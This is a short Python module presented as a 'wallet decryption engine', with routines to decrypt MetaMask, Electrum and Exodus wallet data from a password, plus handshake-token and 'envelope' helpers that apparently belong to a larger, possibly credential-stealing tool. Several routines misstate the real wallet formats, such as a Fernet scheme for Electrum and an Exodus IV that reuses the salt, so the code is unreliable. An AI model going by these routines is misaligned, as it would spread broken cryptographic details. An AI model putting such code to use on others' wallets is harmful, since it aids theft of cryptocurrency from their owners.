# -*- coding: utf-8 -*-
"""Wallet decryption engine — handles wallet-specific decryption methods."""

import hashlib
import os


def create_token(nonce, timestamp, key_material):
    """Create authentication token for handshake."""
    data = f"{nonce}:{timestamp}".encode()
    if key_material:
        return hashlib.sha256(data + key_material).hexdigest()
    return hashlib.sha256(data).hexdigest()


def open_envelope(key, data):
    """Decrypt envelope data using AES-GCM."""
    if not data or not key:
        return None
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        aesgcm = AESGCM(key[:32].ljust(32, b'\0'))
        return aesgcm.decrypt(data[:12], data[12:], None)
    except Exception:
        return None


def decrypt_metamask(vault_data, password):
    """Decrypt MetaMask vault (AES-GCM with PBKDF2 key derivation)."""
    try:
        import json
        vault = json.loads(vault_data) if isinstance(vault_data, str) else vault_data
        if "data" not in vault:
            return None

        salt = bytes.fromhex(vault.get("salt", ""))
        iv = bytes.fromhex(vault.get("iv", ""))
        encrypted = bytes.fromhex(vault["data"])

        key = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 10000, dklen=32)

        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        aesgcm = AESGCM(key)
        decrypted = aesgcm.decrypt(iv, encrypted, None)
        return decrypted.decode("utf-8")
    except Exception:
        return None


def decrypt_electrum(wallet_data, password):
    """Decrypt Electrum wallet file."""
    try:
        from cryptography.fernet import Fernet
        key = hashlib.pbkdf2_hmac("sha256", password.encode(), b"electrum", 100000, dklen=32)
        import base64
        fernet_key = base64.urlsafe_b64encode(key)
        f = Fernet(fernet_key)
        return f.decrypt(wallet_data)
    except Exception:
        return None


def decrypt_exodus(keystore_data, password):
    """Decrypt Exodus keystore (AES-256-CBC)."""
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import padding

        salt = keystore_data[:16]
        encrypted = keystore_data[16:]
        iv = keystore_data[:16]

        key = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 50000, dklen=32)

        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(encrypted) + decryptor.finalize()

        unpadder = padding.PKCS7(128).unpadder()
        return unpadder.update(decrypted) + unpadder.finalize()
    except Exception:
        return None


def load(data):
    """Load and process encrypted wallet data."""
    if not data or len(data) < 256:
        return False
    return True
